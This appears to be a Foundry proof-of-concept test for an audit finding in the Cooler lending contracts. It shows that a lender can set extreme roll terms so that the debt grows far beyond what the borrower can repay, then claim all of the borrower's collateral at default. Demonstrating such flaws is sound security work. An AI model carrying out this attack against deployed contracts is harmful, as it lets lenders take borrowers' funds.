// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {CoolerFactory} from "../../src/CoolerFactory.sol";
import {Cooler} from "../../src/Cooler.sol";
import {Clone} from "clones/Clone.sol";

contract ExploitTest is Test {
    // Test contracts
    CoolerFactory factory;
    Cooler cooler;
    
    // Mock tokens
    MockERC20 collateralToken;
    MockERC20 debtToken;
    
    // Test addresses
    address borrower = address(0xB0B0);
    address lender = address(0xA1A1);
    
    // Loan parameters
    uint256 constant LOAN_AMOUNT = 1000e18; // 1000 debt tokens
    uint256 constant INTEREST_RATE = 5e16; // 5% interest
    uint256 constant LOAN_TO_COLLATERAL = 10e18; // 10 debt tokens per collateral token
    uint256 constant DURATION = 365 days; // 1 year
    
    function setUp() public {
        // Deploy mock tokens
        collateralToken = new MockERC20("Collateral", "COLL", 18);
        debtToken = new MockERC20("Debt", "DEBT", 18);
        
        // Deploy factory
        factory = new CoolerFactory();
        
        // Create cooler clone for borrower
        address coolerAddress = factory.createCooler(
            borrower,
            address(collateralToken),
            address(debtToken)
        );
        cooler = Cooler(payable(coolerAddress));
        
        // Fund borrower with collateral tokens
        vm.label(borrower, "Borrower");
        vm.label(lender, "Lender");
        vm.label(address(collateralToken), "Collateral Token");
        vm.label(address(debtToken), "Debt Token");
        vm.label(address(cooler), "Cooler");
        
        // Give borrower 100 collateral tokens
        collateralToken.mint(borrower, 100e18);
        
        // Give lender enough debt tokens to lend
        debtToken.mint(lender, 10000e18);
        
        // Approve tokens
        vm.prank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);
        
        vm.prank(lender);
        debtToken.approve(address(cooler), type(uint256).max);
    }
    
    function testExploitMaliciousRollTerms() public {
        // Step 1: Borrower requests a loan with reasonable terms
        // Borrower expects to pay back 1050 tokens (1000 + 5% interest)
        vm.prank(borrower);
        uint256 reqId = cooler.requestLoan(
            LOAN_AMOUNT,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        
        // Verify the request was created
        assertTrue(cooler.isActive(reqId), "Request should be active");
        
        // Step 2: Lender clears the request with normal terms
        vm.prank(lender);
        uint256 loanId = cooler.clearRequest(reqId, false, false);
        
        // Verify the loan was created
        (, uint256 amount, , uint256 collateral, , address loanLender, , ) = cooler.getLoan(loanId);
        assertEq(amount, 1050e18, "Loan amount should be 1050 (1000 + 5% interest)");
        assertEq(collateral, 100e18, "Collateral should be 100 tokens");
        assertEq(loanLender, lender, "Lender should be set correctly");
        
        console.log("Initial loan amount:", amount / 1e18);
        console.log("Initial collateral:", collateral / 1e18);
        
        // Step 3: Lender provides malicious roll terms
        // Set extremely high interest rate (10000000% = 100000x)
        // Set very high loan-to-collateral ratio to avoid requiring more collateral
        uint256 maliciousInterest = 10000000e16; // 10000000% interest
        uint256 maliciousLoanToCollateral = 1000000e18; // Very high ratio
        
        vm.prank(lender);
        cooler.provideNewTermsForRoll(
            loanId,
            maliciousInterest,
            maliciousLoanToCollateral,
            DURATION
        );
        
        // Step 4: Lender rolls the loan with malicious terms
        vm.prank(borrower); // Borrower must initiate the roll
        cooler.rollLoan(loanId);
        
        // Step 5: Verify the exploit succeeded
        (, uint256 newAmount, , uint256 newCollateral, , , , ) = cooler.getLoan(loanId);
        
        console.log("After roll - loan amount:", newAmount / 1e18);
        console.log("After roll - collateral:", newCollateral / 1e18);
        
        // The loan amount should be massively inflated
        // Original amount (1050) + malicious interest (1050 * 100000)
        assertTrue(newAmount > 100000e18, "Loan amount should be massively inflated");
        
        // But collateral should remain the same (no additional collateral required)
        assertEq(newCollateral, 100e18, "Collateral should remain unchanged");
        
        // Step 6: Demonstrate the borrower is trapped
        // Calculate how much debt the borrower needs to repay
        uint256 requiredRepayment = newAmount;
        uint256 borrowerDebtBalance = debtToken.balanceOf(borrower);
        
        console.log("Required repayment:", requiredRepayment / 1e18);
        console.log("Borrower's debt balance:", borrowerDebtBalance / 1e18);
        
        // Borrower cannot afford to repay
        assertTrue(requiredRepayment > borrowerDebtBalance, "Borrower cannot afford repayment");
        
        // The only option is to forfeit the collateral
        // Let's fast forward past expiry
        vm.warp(block.timestamp + DURATION + 1);
        
        // Lender claims the defaulted collateral
        vm.prank(lender);
        (uint256 defaultedAmount, uint256 claimedCollateral, ) = cooler.claimDefaulted(loanId);
        
        // Verify lender got the collateral
        assertEq(claimedCollateral, 100e18, "Lender should claim all collateral");
        assertEq(collateralToken.balanceOf(lender), 100e18, "Lender should receive collateral");
        
        console.log("Exploit successful! Lender stole", claimedCollateral / 1e18, "collateral tokens");
    }
}

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}